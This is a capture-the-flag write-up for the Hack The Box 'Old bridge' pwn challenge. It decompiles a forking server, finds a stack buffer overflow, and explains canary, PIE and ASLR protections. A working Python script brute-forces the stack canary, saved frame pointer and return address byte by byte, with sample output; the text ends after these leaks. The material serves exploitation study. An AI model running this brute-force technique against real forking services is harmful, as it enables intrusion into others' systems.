# Hack The Box - PWN - Old bridge

### Binary Analysis
We get a binary copy of the program that runs on the server so we can run it locally and test it.
In this challenge I use Docker to setup the local server for easy debug and testing.

Like previous challenges, I like to start with a binary examination on program... see what it does and where is the exploit.

Let's take a look at the `main`:
Thanks to Ghidra's decompiler we can get general idea of the `main` function:
```c
/* ...  */
  while( true ) {
    local_50 = 0x10;
    local_40 = accept(server_sd,&local_28,&local_50);
    if (local_40 < 0) {
      perror("accept");
      close(server_sd);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    local_3c = fork();
    if (local_3c < 0) break;
    if (local_3c == 0) {
      iVar1 = check_username();
      if (iVar1 != 0) {
        write(local_40,"Username found!\n",0x10);
      }
      close(local_40);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    close(local_40);
  }
  perror("fork");
  close(local_40);
  close(server_sd);
                    /* WARNING: Subroutine does not return */
  exit(1);
/* ... */
```

While it may seem confusing at first, the main loop here just `fork`s on each new connection and calls `check_username` on the child process (the parent does not enter that if statement and returns back to listening to more clients connecting).

No vulnerable code so far, as far as I can tell - we didn't even get to the heart of the program yet. Let's dive to `check_username`

```c
ulong check_username(int param_fd)

{
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  int local_420;
  byte local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(param_fd,"Username: ",10);
  sVar2 = read(param_fd,local_418,0x420);
  local_420 = 0;
  while (local_420 < (int)sVar2) {
    local_418[(long)local_420] = local_418[(long)local_420] ^ 0xd;
    local_420 = local_420 + 1;
  }
  iVar1 = memcmp(local_418,"il{dih",6);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (ulong)(iVar1 == 0);
}

```
After a little bit of cleaning and variable renaming we can see the picture more clearly:

```c

ulong check_username(int param_fd)

{
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  int local_420;
  byte local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(param_fd,"Username: ",10);
  sVar2 = read(param_fd,local_418,0x420);
  local_420 = 0;
  while (local_420 < (int)sVar2) {
    local_418[(long)local_420] = local_418[(long)local_420] ^ 0xd;
    local_420 = local_420 + 1;
  }
  iVar1 = memcmp(local_418,"il{dih",6);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (ulong)(iVar1 == 0);
}
```

The interesting part here is:

1. The `read` calls fill in a buffer with `0x420 = 1056` bytes **but** the buffer it stores it into is only 1032! Buffer overflow detected! are we done?
2. Every single bit of the input from the user is XORed with `0xdz`, then the start of the string is checked against the "hidden" username: `il{dih`. <br>
To reveal the real username we can XOR that text with `0xd` again. We can use a simple Python one-liner we can figure out what is the username:
```python
>>> "".join([chr(ord(t) ^ 0xd) for t in "il{dih"])
'davide'
```

We have enough information about that binary, now I feel it's time to move to live testing and playing around with it. 

I should note that usually the binary examination is much more complex, and starting with the "playing around" phase is probably the smarter choice for pwn challenges in the future. But hey, I'm here to learn.

### Setting up our test server (using Docker)
Docker is a nice tool we can use to setup a linux environment for the process to run so we can play around with it.
To do that, I've downloaded the demo Ubuntu image, installed gdb,peda and more tools on it, and run the following command:

```$ docker run --rm -it --cap-add=SYS_PTRACE -p 1337:1337 --security-opt seccomp=unconfined -v ~/Desktop:/from_host -w /app new_ubuntu```

* `--cap-add=SYS_PTRACE -p 1337:1337 --security-opt seccomp=unconfined` is used for allowing the container to run and debug processes, while connecting the 1337 port between the host (our machine) and the container(which will run the server). That way we can access the server directly from our machine as the client
* `-v ~/Desktop:/from_host` Give the container access to the volume specified from the host. So the container may access our `oldbridge` binary

After running it, we can test the program a little bit:
```
/Users/shaked$ nc localhost 1337
Username: gimme root
/Users/shaked$ nc localhost 1337
Username: davide
Username found!
/Users/shaked$ nc localhost 1337
Username: davideasdasdasdasdasdasdasd
Username found!
```

We know that our buffer is 1032 bytes long, what happens when we overflow it?<br>
`$ python -c 'print "A"*1032' | nc localhost 1337` (1032 "A"s plus a newline character = 1033 bytes)

We get nothing back, and if we look at the server:
```
root@04a0530e836b:/from_host/programming2/challenges/hack_the_box/oldbridge# ./oldbridge 1337
*** stack smashing detected ***: <unknown> terminated
```

### Problem #1 - Stack canary 
What had happend? why not SIGSEGV? If we go back to the source code again we can see that there's a use of a stack guard, a stack canary value. A stack canary is a random value that is placed right before the stack frame ends. That is, it is placed above the old frame pointer and the return address.

When the function is done, there's a check between the stack canary and the location which is it was originally stored (which we cannot override) and if there's a mismatch - the program knows someone has messed up the stack and exit *un-gracefully*;
```c
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
```

### Problem #2 - Position Independent Executable (PIE) 
Usually when you compile a simple program, the compiler can assume the regular address space for the program headers (.text section, .bss, .data, etc...) and during runtime the system would not randomize that part (as we saw in ROPme).

But - when you compile a library, you compile it as PIE, so the code inside it may be loaded into any address in the future. 

You can, if you like - compile a program with the `-fPIE` flag and it would still run perfectly. And it would have effectively randomize the code section of our binary during runtime. This makes things hard for us in finding gadgets to use, because everytime the program loads, a new address is issued for all of the variables! **But** let us not forget that the randomization is **page based*, and only the base of the section is randomized.

So if we would know the base which the .text section was loaded into, we can figure out where the rest of the symbols are by looking at the binary given to us.

### Problem #3 - ASLR 
Same as ROPme, makes it hard for us to find gadgets, not just in the .text section - but also from libc or the stack

### Problem #4 - Libc version
Even if we would defeat ASLR, we still need to know the offsets of gadgets for us to use.

### One solution for all
In the `main()`, before any client is being processed, the process is `fork`ed. 

`fork()` is copying the entire process memory to a child except for 1 register, the `rax`. This is so that the child would be able to tell that it was forked. 

**This is GREAT for us because this means that every child created, and the parent as well, will share the same libc base, .text section base, the stack canary and even the stack base!**

So what do we do? first we have to leak the canary, because it is the first value that is being overriden after the buffer overflows.

Our strategy would be to try and override a *single* byte from the canary, one at a time - and if we get a valid repsponse from the server( "Username found!") we can learn that the system thinks the canary is intact and we effectively learned a byte from the canary!

We can now start writing our exploit:
```python
import socket

SERVER = ("localhost", 1337)

def send_payload(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(SERVER)
    s.recv(4096)
    s.send(p)

    res = False
    try:
        line = s.recv(4096)
        res = "Username found!" in line

    finally:
        s.close()

    return res

def leak_next_byte(prefix):
    for test_byte in [chr(t) for t in range(256)]:
        if send_payload(prefix + test_byte):
            print "Found:", hex(ord(test_byte))
            return prefix + test_byte


def main():
    payload = "davide"
    payload += "B" * (1032 - len(payload))

    leak_next_byte(payload)

if __name__ == "__main__":
    main()
```

We have a small function that sends a payload and reports if the payload is good (by checking if the server returned the "Username found!" message). If the server fails - no message will be sent back and we would know that we have broken the stack canary.<br>
We use `leak_next_byte` to leak the next 8 bytes from the stack:

```python
def leak_canary(prefix):
    payload = prefix
    for i in range(8):
        payload = leak_next_byte(payload)
    return payload[-8:]
```

```
$ python exploit.py 
Found: 0xd
Found: 0xcc
Found: 0x75
Found: 0xf0
Found: 0x95
Found: 0xff
Found: 0x6c
Found: 0xcb
Canary:
0xcb6cff95f075cc0dL
```

Note: the canary we display is the canary after XORed with `0xd`. This is because our byte that we test are XORed and then placed to the canary.

### What's past the canary?
After the canary there's the old frame pointer. Which usually we find it insignificant because we want to go straight ahead to override the return address which located right after it.

But in here, we do not have enough stack space for a long ROP chain like in ROPme, we can override the buffer (1032 bytes), the canary (1040), the old rbp (1048) and the return address (1056) and *that's it*.

Before we think about how to jump around in the program, let's use the previous technique to leak the old RBP on the stack as well as the return address.<br>
We can do that because if we want to receive "Username found!" from the server, the `main()` function would need the right stack pointer set to load values from the stack to those `write` calls. if we mess it up even a little bit, we can notice it in our client side by not receiving the message.

**Leaking the return address is a little bit more difficult**. Because we start by overriding the least significant byte, the program might return to some other location in the `main`, it could be another `fork` or `accept` and make things be a little less predictible for us. <br>
But - since the randomization is only effective for the least 12 bits of the return address, the first byte will definitely not change:

The return address from `check_username` is:
```
   0x0000555555554eca <+561>:	call   0x555555554b6f <check_username>
   0x0000555555554ecf <+566>:	test   eax,eax
```

So it would always end with `0xcf`!

```python
def leak_n_bytes(prefix, n):
    payload = prefix
    for i in range(n):
        payload = leak_next_byte(payload)
    return payload[-n:]

def main():
    payload = "davide"
    payload += "B" * (1032 - len(payload))

    print "Leaking canary"
    canary = leak_n_bytes(payload, 8)
    print "Leaking old RBP"
    old_rbp = leak_n_bytes(payload + canary, 8)
    print "Leaking return address"
    ret_addr = leak_n_bytes(payload + canary + old_rbp + chr(ord("\xcf") ^ 0xd), 7)
```

```
$ python exploit.py 
Leaking canary
Found: 0xd
Found: 0xc0
Found: 0x2a
Found: 0xf7
Found: 0x4c
Found: 0xf6
Found: 0x34
Found: 0x5d
Leaking old RBP
Found: 0x5d
Found: 0xf6
Found: 0x2b
Found: 0xad
Found: 0xf2
Found: 0x72
Found: 0xd
Found: 0xd
Leaking return address
Found: 0x13
Found: 0xe9
Found: 0x6e
Found: 0xad
Found: 0x58
Found: 0xd
Found: 0xd
Found: 0x0
```